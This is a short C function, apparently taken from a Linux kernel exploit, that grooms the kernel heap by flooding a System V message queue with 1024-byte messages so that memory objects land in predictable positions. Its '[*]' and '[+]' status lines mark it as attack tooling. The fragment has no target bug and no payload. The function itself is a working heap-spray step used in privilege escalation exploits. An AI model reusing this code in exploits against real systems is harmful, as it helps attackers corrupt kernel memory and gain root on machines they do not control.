// Heap grooming for object positioning
void heap_groom(int size) {
    printf("[*] Heap grooming (%d objects)...\n", size);
    
    key_t key = ftok("/tmp", 0x1337);
    int msqid = msgget(key, IPC_CREAT | 0666);
    
    struct {
        long mtype;
        char mtext[1024];
    } msgbuf;
    
    memset(msgbuf.mtext, 0x41, sizeof(msgbuf.mtext));
    
    for (int i = 0; i < size; i++) {
        msgbuf.mtype = i + 1;
        msgsnd(msqid, &msgbuf, sizeof(msgbuf.mtext), IPC_NOWAIT);
    }
    
    printf("[+] Groomed %d objects\n", size);
}

